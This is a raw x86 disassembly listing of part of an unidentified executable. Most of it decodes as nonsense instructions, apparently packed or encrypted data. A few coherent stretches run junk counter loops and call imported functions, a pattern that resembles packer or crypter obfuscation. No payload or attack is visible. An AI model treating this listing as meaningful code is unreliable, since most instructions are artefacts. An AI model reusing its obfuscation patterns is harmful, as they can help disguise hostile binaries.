  409e63:	fistp  QWORD PTR [edx]
  409e65:	jnp    0x409ec5
  409e67:	int    0xad
  409e69:	xchg   ebx,eax
  409e6a:	ffree  st(6)
  409e6c:	and    ax,0x5a21
  409e70:	sbb    bh,BYTE PTR [ebp+0x74d0f115]
  409e76:	arpl   WORD PTR [edx-0x28],cx
  409e79:	and    BYTE PTR [ecx-0x1e],cl
  409e7c:	cdq    
  409e7d:	cmp    al,0xc4
  409e7f:	idiv   cl
  409e81:	popa   
  409e82:	pop    ebp
  409e83:	lods   al,BYTE PTR ds:[esi]
  409e84:	jne    0x409e5c
  409e86:	xor    edi,edi
  409e88:	test   BYTE PTR [edi],al
  409e8a:	bound  edx,QWORD PTR [edx]
  409e8c:	and    al,0x98
  409e8e:	jecxz  0x409e8c
  409e90:	aam    0x2c
  409e92:	and    BYTE PTR [edx-0x80],0xba
  409e96:	test   edx,0xbe7fdccd
  409e9c:	jno    0x409eea
  409e9e:	cmp    ecx,DWORD PTR [esi+0x582b54df]
  409ea4:	sub    ah,al
  409ea6:	retf   
  409ea7:	pop    eax
  409ea8:	fs xchg ecx,eax
  409eaa:	add    bh,BYTE PTR [ebx]
  409eac:	shl    DWORD PTR [ebp-0x5c4535e6],1
  409eb2:	loope  0x409e78
  409eb4:	push   ebp
  409eb5:	ss mov ch,0x88
  409eb8:	shr    BYTE PTR [esi-0x45],cl
  409ebb:	and    dl,cl
  409ebd:	data16 in al,dx
  409ebf:	jge    0x409ea4
  409ec1:	aaa    
  409ec2:	cdq    
  409ec3:	mov    edi,0x521a1bb5
  409ec8:	dec    edx
  409ec9:	cdq    
  409eca:	dec    ebp
  409ecb:	dec    ebx
  409ecc:	xchg   ebx,eax
  409ecd:	fistp  DWORD PTR [ebx+0x27]
  409ed0:	leave  
  409ed1:	mov    ah,0x44
  409ed3:	xchg   edx,eax
  409ed4:	xor    bh,dl
  409ed6:	nop
  409ed7:	and    BYTE PTR [ebp-0x176f5e7b],ch
  409edd:	out    0xab,eax
  409edf:	fist   DWORD PTR [edx-0x21bc29dd]
  409ee5:	aaa    
  409ee6:	sbb    eax,0x60be94ef
  409eeb:	pop    ebp
  409eec:	jmp    DWORD PTR [esi]
  409eee:	fs dec ebp
  409ef0:	and    esp,edx
  409ef2:	pop    ebp
  409ef3:	mov    DWORD PTR [esi-0x6f79b2a8],eax
  409ef9:	ror    esp,0xd1
  409efc:	sbb    dh,BYTE PTR [eax]
  409efe:	xchg   esi,eax
  409eff:	xchg   edi,eax
  409f00:	jb     0x409f6b
  409f02:	mov    eax,ds:0x8d019a5c
  409f07:	mov    ds:0x9b2591f3,al
  409f0c:	add    BYTE PTR [edi],al
  409f0e:	cmp    BYTE PTR [edi],dh
  409f10:	dec    esp
  409f11:	out    0x54,eax
  409f13:	imul   ebp,DWORD PTR [ebp+0x19a8a440],0x1e70b04
  409f1d:	dec    esi
  409f1e:	mov    ds:0x6144beab,eax
  409f23:	enter  0x9205,0xbc
  409f27:	icebp  
  409f28:	sub    ah,bh
  409f2a:	movzx  edi,WORD PTR [eax+0x43cfbfc3]
  409f31:	sbb    cl,0x68
  409f34:	cmp    DWORD PTR [ecx-0x6079df8b],edx
  409f3a:	push   esp
  409f3b:	(bad)  
  409f3c:	cdq    
  409f3d:	(bad)  
  409f3e:	stc    
  409f3f:	xchg   DWORD PTR [edi-0x7e14c004],ebx
  409f45:	jb     0x409ed5
  409f47:	cmp    DWORD PTR ds:0xd80d14b7,esp
  409f4d:	lock push esp
  409f4f:	repnz inc esp
  409f51:	fwait
  409f52:	xor    DWORD PTR [ebx+0x15],edi
  409f55:	xor    dh,BYTE PTR [ecx]
  409f57:	lods   eax,DWORD PTR ds:[esi]
  409f58:	cs retf 0xde2d
  409f5c:	in     eax,dx
  409f5d:	lds    esp,FWORD PTR [esp+ebp*8+0x709763ea]
  409f64:	xchg   edi,eax
  409f65:	pusha  
  409f66:	pop    ebx
  409f67:	sub    bh,BYTE PTR [esi+0x51]
  409f6a:	repnz lds ebp,FWORD PTR [ecx+0x49]
  409f6e:	mov    bl,0x19
  409f70:	fist   WORD PTR [esi+0x5a0e6951]
  409f76:	dec    ebp
  409f77:	test   eax,0x8c0d43b4
  409f7c:	stos   DWORD PTR es:[edi],eax
  409f7d:	jle    0x409f5b
  409f7f:	fs pop es
  409f81:	mov    bl,0x4e
  409f83:	mov    al,ds:0x71d68c1a
  409f88:	outs   dx,DWORD PTR ds:[esi]
  409f89:	mov    al,0xf4
  409f8b:	call   0x990b:0x493182d0
  409f92:	mov    dh,0x75
  409f94:	mov    bh,0x98
  409f96:	xchg   edx,eax
  409f97:	clc    
  409f98:	xor    eax,0x48c9d331
  409f9d:	add    ecx,DWORD PTR [edx]
  409f9f:	les    esi,FWORD PTR [edi-0x6c]
  409fa2:	cld    
  409fa3:	out    dx,eax
  409fa4:	rcl    BYTE PTR [edi],0x10
  409fa7:	sbb    eax,0x77fd5ae4
  409fac:	sti    
  409fad:	and    edi,DWORD PTR [edx]
  409faf:	pop    eax
  409fb0:	mov    ebx,0xad9085b2
  409fb5:	mov    ss,WORD PTR [esp+ecx*8]
  409fb8:	xchg   esp,eax
  409fb9:	push   edx
  409fba:	xchg   edx,eax
  409fbb:	sbb    eax,0xd1c42542
  409fc0:	mov    dh,0xd7
  409fc2:	mov    dl,0xe0
  409fc4:	jmp    0x7c3f268b
  409fc9:	jg     0x409ffa
  409fcb:	jl     0x409fb2
  409fcd:	test   al,0x82
  409fcf:	mov    DWORD PTR [esi],edx
  409fd1:	cmp    al,0x39
  409fd3:	sub    eax,0xae19182d
  409fd8:	add    dl,BYTE PTR ds:0xb5aa888e
  409fde:	pop    edi
  409fdf:	adc    BYTE PTR [ecx-0x58],dl
  409fe2:	or     eax,0x907b2f59
  409fe7:	sbb    DWORD PTR [eax-0x59],edi
  409fea:	nop
  409feb:	enter  0xd7ec,0x54
  409fef:	mov    cl,0x9c
  409ff1:	or     eax,0x55d59a84
  409ff6:	aad    0x61
  409ff8:	ja     0x40a073
  409ffa:	out    dx,al
  409ffb:	inc    ecx
  409ffc:	out    0xf9,al
  409ffe:	data16 sub bl,BYTE PTR [ecx-0xb]
  40a002:	xchg   BYTE PTR [eax-0x59a7de27],bl
  40a008:	jnp    0x40a01c
  40a00a:	cld    
  40a00b:	or     ebx,ebx
  40a00d:	add    eax,0xaf0f1d6d
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4337d3
  40a01e:	sbb    DWORD PTR ds:0x43370f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433763,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433723
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43375b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43375b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43375b,ecx
  40a059:	cmp    DWORD PTR ds:0x43375b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43393e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43375b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43370b,0x11
  40a090:	cmp    DWORD PTR ds:0x43370b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43370b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43370b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43370b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43370b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43370b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43370b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433703,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43376f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433713
  40a0ff:	mov    DWORD PTR ds:0x43376f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433767,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	push   0x22
  40a128:	add    DWORD PTR [bp+si+0x7ee0],eax
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a14e
  40a133:	aas    
  40a134:	mov    ch,0x29
  40a136:	push   ds
  40a137:	add    eax,0x25bf4f09
  40a13c:	(bad)  
  40a13d:	scas   eax,DWORD PTR es:[edi]
  40a13e:	mov    WORD PTR [ecx+0x6ee7e241],fs
  40a144:	call   0x8fcb:0x2240770f
  40a14b:	out    dx,al
  40a14c:	popa   
  40a14d:	xor    DWORD PTR [ebx],edx
  40a14f:	sub    DWORD PTR [ecx],edx
  40a151:	sub    eax,0xe4e45049
  40a156:	or     DWORD PTR [edx+0x3f901616],edi
  40a15c:	sbb    edx,ebx
  40a15e:	dec    ebx
  40a15f:	xlat   BYTE PTR ds:[ebx]
  40a160:	stos   DWORD PTR es:[edi],eax
  40a161:	push   cs
  40a162:	mov    ch,0xa4
  40a164:	fist   WORD PTR [edx-0x5e]
  40a167:	outs   dx,BYTE PTR ds:[esi]
  40a168:	add    BYTE PTR [ebx+0x4e7e1351],al
  40a16e:	lods   al,BYTE PTR ds:[esi]
  40a16f:	sub    DWORD PTR ds:0xdf561d92,ebx
  40a175:	add    eax,0xe745fe81
  40a17a:	pop    ebp
  40a17b:	loope  0x40a1e6
  40a17d:	and    eax,ebp
  40a17f:	xor    esi,DWORD PTR [esp+edi*8-0x6bc27895]
  40a186:	js     0x40a1a4
  40a188:	xchg   ecx,eax
  40a189:	sub    DWORD PTR [edi],ebp
  40a18b:	call   0x7442:0xe01447da
  40a192:	sahf   
  40a193:	jg     0x40a11e
  40a195:	xchg   ebp,eax
  40a196:	iret   
  40a197:	mov    al,ds:0xef1208bd
  40a19c:	cmp    cl,cl
  40a19e:	mov    edx,0xbc735743
  40a1a3:	adc    cl,ah
  40a1a5:	jno    0x40a156
  40a1a7:	pushf  
  40a1a8:	jo     0x40a1db
  40a1aa:	arpl   WORD PTR [esi],bx
  40a1ac:	js     0x40a18e
  40a1ae:	pop    eax
  40a1af:	enter  0x8f33,0x79
  40a1b3:	cmp    DWORD PTR [esp+ebp*8-0x48307b8d],0xc2d2ffca
  40a1be:	cmp    al,0x69
  40a1c0:	xchg   DWORD PTR [edx],esi
  40a1c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1c3:	ret    0xd1ee
  40a1c6:	push   ebx
  40a1c7:	inc    ebx
  40a1c8:	shl    esp,0x33
  40a1cb:	push   0x3e
  40a1cd:	and    DWORD PTR [edi],eax
  40a1cf:	adc    DWORD PTR [ecx+ecx*1],0x333279f0
  40a1d6:	xchg   esi,eax
  40a1d7:	pop    eax
  40a1d8:	pop    ss
  40a1d9:	mov    al,ds:0xeff84cab
  40a1de:	mov    ebx,0xa5b35349
  40a1e3:	mov    DWORD PTR [ecx+0x67],edi
  40a1e6:	dec    esp
  40a1e7:	int    0x76
  40a1e9:	int3   
  40a1ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1eb:	mov    ebx,DWORD PTR [eax-0xd6316b1]
  40a1f1:	push   cs
  40a1f2:	add    BYTE PTR [esi-0x20],ah
  40a1f5:	cs ins BYTE PTR es:[edi],dx
  40a1f7:	mov    ds:0xfb51bbfb,al
  40a1fc:	mov    ebx,0x65f9530b
  40a201:	inc    edx
  40a202:	push   es
  40a203:	cmp    bl,BYTE PTR [edx]
  40a205:	scas   al,BYTE PTR es:[edi]
  40a206:	aas    
  40a207:	pop    esi
  40a208:	mov    dh,0xec
  40a20a:	fst    QWORD PTR [ecx]
  40a20c:	ds std 
  40a20e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a20f:	xchg   esi,eax
  40a210:	jbe    0x40a1ac
  40a212:	push   0x73bd0746
  40a217:	mov    eax,0xc442e83e
  40a21c:	pop    ss
  40a21d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a21e:	(bad)  
  40a21f:	xor    al,0xa5
  40a221:	out    dx,al
  40a222:	dec    esi
  40a223:	mov    eax,ds:0x21ffa76d
  40a228:	stos   BYTE PTR es:[edi],al
  40a229:	and    BYTE PTR [edi],ah
  40a22b:	push   ss
  40a22c:	(bad)  
  40a22d:	cmp    eax,0x7bc055b9
  40a232:	or     BYTE PTR [ebx],dl
  40a234:	std    
  40a235:	gs mov eax,0x51a24374
  40a23b:	sbb    eax,0x9f78bb91
  40a240:	sub    eax,DWORD PTR [esi]
  40a242:	xchg   edi,eax
  40a243:	loop   0x40a1e2
  40a245:	fs mov dl,0x39
  40a248:	test   DWORD PTR [eax+0x63],edi
  40a24b:	into   
  40a24c:	pop    eax
  40a24d:	inc    edi
  40a24e:	push   ecx
  40a24f:	or     ah,BYTE PTR [ecx+eiz*8]
  40a252:	mov    ebx,?
  40a254:	pop    eax
  40a255:	loopne 0x40a1f7
  40a257:	imul   esp,esi,0x127eb286
  40a25d:	adc    BYTE PTR [ecx+0x4c],0xcc
  40a261:	push   esp
  40a262:	mov    ebp,0x157e6059
  40a267:	shl    DWORD PTR [eax-0x2e],1
  40a26a:	gs pop esp
  40a26c:	mov    al,ah
  40a26e:	jmp    0x40a2e8
  40a270:	dec    ecx
  40a271:	clc    
  40a272:	dec    eax
  40a273:	mov    eax,ds:0x7e03aeb5
  40a278:	and    DWORD PTR [ebx+0x58],esp
  40a27b:	push   esi
  40a27c:	(bad)  
  40a27e:	xor    al,BYTE PTR [eax-0xb]
  40a281:	pop    ebx
  40a282:	inc    ebx
  40a283:	rcl    DWORD PTR [ebx-0x3d66cd2b],1
  40a289:	or     DWORD PTR [ebp-0x16],eax
  40a28c:	xor    bl,BYTE PTR [ebx+eiz*1]
  40a28f:	pop    esi
  40a290:	mov    ecx,0xbcc28a3a
  40a295:	cdq    
  40a296:	ins    BYTE PTR es:[edi],dx
  40a297:	lahf   
  40a298:	mov    ecx,0x78f02d83
  40a29d:	xchg   edi,eax
  40a29e:	aad    0x7b
  40a2a0:	push   cs
  40a2a1:	out    0xec,eax
  40a2a3:	nop
  40a2a4:	sbb    BYTE PTR [edx],ch
  40a2a6:	sbb    al,0x27
  40a2a8:	je     0x40a2a6
  40a2aa:	out    0x30,eax
  40a2ac:	lds    eax,FWORD PTR [esi+edx*1-0x4e]
  40a2b0:	dec    ebx
  40a2b1:	and    eax,0xcf0c5f02
  40a2b6:	xor    ch,BYTE PTR [eax]
  40a2b8:	call   0xbf07:0xa93bf047
  40a2bf:	in     al,0xc4
  40a2c1:	test   dh,bl
  40a2c3:	fistp  QWORD PTR [edi+0x149638a3]
  40a2c9:	pop    eax
  40a2ca:	push   eax
  40a2cb:	je     0x40a2fd
  40a2cd:	pop    es
  40a2ce:	cwde   
  40a2cf:	aas    
  40a2d0:	shl    DWORD PTR [ecx+ebp*2+0x73],cl
  40a2d4:	(bad)  
  40a2d5:	mov    al,0x15
  40a2d7:	and    dl,BYTE PTR [edx+0x73]
  40a2da:	cdq    
  40a2db:	xchg   ebx,eax
  40a2dc:	push   ss
  40a2dd:	pop    eax
  40a2de:	imul   edx,DWORD PTR [ebx-0x45bc1790],0xffffffae
  40a2e5:	inc    esi
  40a2e6:	cs inc esp
  40a2e8:	ins    BYTE PTR es:[edi],dx
  40a2e9:	es dec ecx
  40a2eb:	xlat   BYTE PTR ds:[ebx]
  40a2ec:	xor    al,0x29
  40a2ee:	pop    esi
  40a2ef:	stos   DWORD PTR es:[edi],eax
  40a2f0:	iret   
  40a2f1:	ins    BYTE PTR es:[edi],dx
  40a2f2:	sbb    DWORD PTR [edi],ebp
  40a2f4:	or     al,0xd1
  40a2f6:	push   edx
  40a2f7:	xor    eax,DWORD PTR [ebx]
  40a2f9:	outs   dx,DWORD PTR ds:[esi]
  40a2fa:	cmp    al,0x3a
  40a2fc:	js     0x40a318
  40a2fe:	cmp    al,0x41
  40a300:	(bad)  [ebx-0x9]
  40a303:	sahf   
  40a304:	je     0x40a2bf
  40a306:	add    eax,DWORD PTR ds:0xf975571e
  40a30c:	scas   al,BYTE PTR es:[edi]
  40a30d:	mov    dh,0x51
  40a30f:	call   0x9bd1b0e6
  40a314:	data16 jbe 0x40a2bc
  40a317:	out    0xa2,eax
  40a319:	jmp    0x40a2fb
  40a31b:	retf   
  40a31c:	jno    0x40a35f
  40a31e:	mov    ah,0x32
  40a320:	or     DWORD PTR [eax-0x70],edi
  40a323:	arpl   WORD PTR [esi],di
  40a325:	mov    edi,0x5c71f5b0
  40a32a:	int    0x54
  40a32c:	lods   al,BYTE PTR ds:[esi]
  40a32d:	cmp    bl,BYTE PTR [ebx-0x6e]
  40a330:	jnp    0x40a2e6
  40a332:	push   cs
  40a333:	inc    edx
  40a334:	xor    dh,ah
  40a336:	std    
  40a337:	(bad)  
  40a338:	(bad)  
  40a339:	lods   al,BYTE PTR ds:[esi]
  40a33a:	adc    eax,0x903fe4f
  40a33f:	xchg   esp,edi
  40a341:	push   0x462db48b
  40a346:	outs   dx,BYTE PTR ds:[esi]
  40a347:	sbb    al,0xa3
  40a349:	sbb    al,0xf2
  40a34b:	mov    esi,esp
  40a34d:	int3   
  40a34e:	mov    bh,0x45
  40a350:	and    dl,bl
  40a352:	imul   edi,DWORD PTR [ecx-0x684ef837],0xe53780bc
  40a35c:	sub    ecx,DWORD PTR [esi-0x6d]
  40a35f:	add    esp,esp
  40a361:	imul   esp,DWORD PTR ds:0xf49e,0xffffffa7
  40a367:	cmp    eax,0x33ba92ac
  40a36c:	sbb    al,0x69
  40a36e:	scas   eax,DWORD PTR es:[edi]
  40a36f:	ins    DWORD PTR es:[edi],dx
  40a370:	pop    ss
  40a371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a372:	es dec ebx
  40a374:	retf   
  40a375:	sub    ch,ch
  40a377:	mov    ah,0x8b
  40a379:	dec    ebp
  40a37a:	call   0x25c26bb2
  40a37f:	sti    
  40a380:	ss inc ebx
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    BYTE PTR [eax],al
  40a386:	add    cl,ch
  40a388:	push   cs
  40a389:	add    BYTE PTR [eax],al
  40a38b:	add    BYTE PTR [ebx],dh
  40a38d:	shl    BYTE PTR [ebx],0x5
  40a390:	sti    
  40a391:	ss inc ebx
  40a393:	add    BYTE PTR [eax-0x5d],al
  40a396:	sti    
  40a397:	ss inc ebx
  40a399:	add    BYTE PTR [ebx+0x4336fb3d],al
  40a39f:	add    BYTE PTR [esi],dl
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4336fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4337ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43376b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433767,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433767,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433767,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433797
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433767,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433767
  40a434:	dec    eax
  40a435:	mov    ds:0x433767,eax
  40a43a:	mov    eax,ds:0x433767
  40a43f:	dec    eax
  40a440:	mov    ds:0x433767,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43371f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43382f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433823,0x4337a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433707,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	mov    dh,0x3e
  40a49d:	pop    eax
  40a49e:	pushf  
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	or     eax,0x3c8c22ca
  40a4ac:	retf   
  40a4ad:	out    0x51,eax
  40a4af:	jmp    FWORD PTR [esi+0x906fd2d]
  40a4b5:	mov    ?,WORD PTR [esi+0x16]
  40a4b8:	push   ebp
  40a4b9:	xchg   esp,eax
  40a4ba:	inc    eax
  40a4bb:	aas    
  40a4bc:	daa    
  40a4bd:	push   esi
  40a4be:	clc    
  40a4bf:	xor    DWORD PTR [ebp+0x3ca2e451],ebp
  40a4c5:	jecxz  0x40a4c3
  40a4c7:	icebp  
  40a4c8:	shl    BYTE PTR [edx*2-0x1d6838c6],0x9c
  40a4d0:	jb     0x40a460
  40a4d2:	jns    0x40a4fb
  40a4d4:	repz pop ds
  40a4d6:	mov    ds:0x81965526,eax
  40a4db:	ins    BYTE PTR es:[edi],dx
  40a4dc:	xor    eax,0xf760a3b3
  40a4e1:	and    al,0x96
  40a4e3:	gs mov ecx,0x20c4d212
  40a4e9:	(bad)  
  40a4ea:	jge    0x40a514
  40a4ec:	ret    0x2c43
  40a4ef:	fdiv   QWORD PTR [eax+eax*1-0x8245c56]
  40a4f6:	outs   dx,BYTE PTR ds:[esi]
  40a4f7:	ret    
  40a4f8:	out    dx,eax
  40a4f9:	adc    eax,0xe96e48c7
  40a4fe:	cmp    BYTE PTR [esi+ecx*2],al
  40a501:	mov    BYTE PTR [eax],ch
  40a503:	daa    
  40a504:	adc    edx,DWORD PTR [ebx]
  40a506:	jmp    0x8f2c1a3b
  40a50b:	pusha  
  40a50c:	mov    edx,DWORD PTR [ebx+0x4ee41b42]
  40a512:	jne    0x40a4cf
  40a514:	and    eax,0x3f059c10
  40a519:	cmp    al,0xba
  40a51b:	and    ebx,edi
  40a51d:	pop    ecx
  40a51e:	jp     0x40a538
  40a520:	mov    esp,DWORD PTR [ebp-0x1c8f0d56]
  40a526:	out    dx,al
  40a527:	inc    ecx
  40a528:	push   edi
  40a529:	(bad)  
  40a52a:	push   edx
  40a52b:	inc    esp
  40a52c:	jge    0x40a50c
  40a52e:	adc    bl,ah
  40a530:	or     BYTE PTR [ecx-0x7d],dh
  40a533:	fimul  WORD PTR [eax]
  40a535:	add    ah,bh
  40a537:	and    DWORD PTR [ecx-0xa],esp
  40a53a:	jmp    0xf075b878
  40a53f:	add    BYTE PTR [esi],dh
  40a541:	mov    ch,0x98
  40a543:	or     edx,esi
  40a545:	push   ecx
  40a546:	lock sub al,0x44
  40a549:	cmp    eax,0xaf6153a3
  40a54e:	mov    eax,ds:0x777e73f6
  40a553:	inc    esi
  40a554:	push   edi
  40a555:	pop    ecx
  40a556:	mov    al,ds:0xc9ecc29
  40a55b:	lods   al,BYTE PTR ds:[esi]
  40a55c:	mov    ds:0x90fd2229,eax
  40a561:	dec    ecx
  40a562:	mov    ds,esp
  40a564:	cs enter 0x914d,0xfa
  40a569:	mov    ah,0x58
  40a56b:	xchg   edx,eax
  40a56c:	je     0x40a575
  40a56e:	inc    ebx
  40a56f:	pop    ss
  40a570:	pop    ebx
  40a571:	push   ebx
  40a572:	jl     0x40a4f5
  40a574:	xor    DWORD PTR [ebx],eax
  40a576:	adc    eax,0x10eba506
  40a57b:	fist   WORD PTR [ebp-0x352844eb]
  40a581:	cdq    
  40a582:	and    ebp,edi
  40a584:	loopne 0x40a547
  40a586:	stc    
  40a587:	stos   BYTE PTR es:[edi],al
  40a588:	sbb    ah,BYTE PTR [edi]
  40a58a:	mov    ecx,0xe9d6dbb2
  40a58f:	xor    al,0xe2
  40a591:	mov    ch,0x15
  40a593:	xchg   DWORD PTR ds:0x456a028c,ecx
  40a599:	add    al,0x2
  40a59b:	or     ch,BYTE PTR [ebx+ecx*2-0x75]
  40a59f:	push   ebx
  40a5a0:	in     eax,dx
  40a5a1:	call   0x3cef:0xb44af7e9
  40a5a8:	pop    es
  40a5a9:	inc    edx
  40a5aa:	enter  0x57a5,0x3c
  40a5ae:	cmp    eax,0x3958a66d
  40a5b3:	das    
  40a5b4:	inc    esp
  40a5b5:	jl     0x40a5db
  40a5b7:	jae    0x40a5fc
  40a5b9:	retf   
  40a5ba:	xor    eax,0x3ada0272
  40a5bf:	sub    al,0x62
  40a5c1:	push   0x61
  40a5c3:	xchg   edi,edx
  40a5c5:	cmp    DWORD PTR [ecx+0x50252a95],ebp
  40a5cb:	push   ss
  40a5cc:	test   eax,0x9fc7e7c1
  40a5d1:	sbb    BYTE PTR [esi*1-0xbaf0ebb],ah
  40a5d8:	cmc    
  40a5d9:	ror    ah,0x5e
  40a5dc:	(bad)  
  40a5de:	(bad)  
  40a5df:	jl     0x40a5ee
  40a5e1:	(bad)  
  40a5e3:	push   DWORD PTR [ecx+0x8a1486]
  40a5e9:	jle    0x40a5eb
  40a5eb:	mov    ds:0xdc439e84,eax
  40a5f0:	dec    ecx
  40a5f1:	mov    dl,0x4
  40a5f3:	xchg   ebx,eax
  40a5f4:	mov    eax,DWORD PTR [ebx+0x1c]
  40a5f7:	dec    esp
  40a5f8:	pop    ecx
  40a5f9:	enter  0x61a7,0x84
  40a5fd:	pop    ebp
  40a5fe:	jge    0x40a608
  40a600:	cmc    
  40a601:	fidivr DWORD PTR [eax-0x54]
  40a604:	mov    al,ds:0xc1b2f757
  40a609:	rol    BYTE PTR [eax+0x35],0x74
  40a60d:	fstp   QWORD PTR [edx]
  40a60f:	pop    esi
  40a610:	cmp    eax,0x1478f446
  40a615:	shl    DWORD PTR [esi+0x6a],cl
  40a618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a619:	dec    ecx
  40a61a:	imul   edx,DWORD PTR ds:0x96ddd5c0,0xffffffce
  40a621:	sbb    ecx,DWORD PTR [eax]
  40a623:	cmp    eax,0x3d835075
  40a628:	out    0xb2,al
  40a62a:	leave  
  40a62b:	xchg   esp,eax
  40a62c:	aas    
  40a62d:	(bad)  
  40a62e:	jbe    0x40a630
  40a630:	mov    al,0xf5
  40a633:	in     al,dx
  40a634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a635:	inc    ebp
  40a636:	lds    edi,FWORD PTR [ebx+0x66]
  40a639:	fild   DWORD PTR [edx-0x28]
  40a63c:	ror    BYTE PTR [edi+0x5d7ae03f],1
  40a642:	mov    al,0xa9
  40a644:	out    0x38,al
  40a646:	ins    BYTE PTR es:[edi],dx
  40a647:	aam    0x82
  40a649:	jne    0x40a653
  40a64b:	into   
  40a64c:	fsubrp st(5),st
  40a64e:	scas   eax,DWORD PTR es:[edi]
  40a64f:	add    esp,DWORD PTR [esi-0x23854ad5]
  40a655:	cld    
  40a656:	or     DWORD PTR [edx+0x3b750eb0],eax
  40a65c:	or     al,0x9e
  40a65e:	or     ah,BYTE PTR [edi+0x54a8e84e]
  40a664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a665:	and    DWORD PTR [edi+0x4b],ebx
  40a668:	sbb    DWORD PTR [edx],ecx
  40a66a:	push   edx
  40a66b:	push   ebp
  40a66c:	sbb    cl,BYTE PTR [ebp+edx*2-0xbe96533]
  40a673:	cmp    eax,0x283c9f7
  40a678:	push   0x478429a9
  40a67d:	sbb    al,BYTE PTR [ecx-0x61]
  40a680:	hlt    
  40a681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a682:	inc    ebp
  40a683:	ja     0x40a691
  40a685:	icebp  
  40a686:	enter  0x6d1d,0x84
  40a68a:	sbb    cl,cl
  40a68c:	pop    ds
  40a68d:	xchg   ebx,eax
  40a68e:	mov    ecx,ecx
  40a690:	(bad)  
  40a693:	lock mov bl,0x91
  40a696:	maxps  xmm3,XMMWORD PTR [ebp+eiz*4+0x19bde989]
  40a69e:	mov    ebp,0x44a7ad11
  40a6a3:	mov    ebx,0xb7dbdace
  40a6a8:	mov    fs,WORD PTR [esi-0x2c31cc4f]
  40a6ae:	and    ah,dh
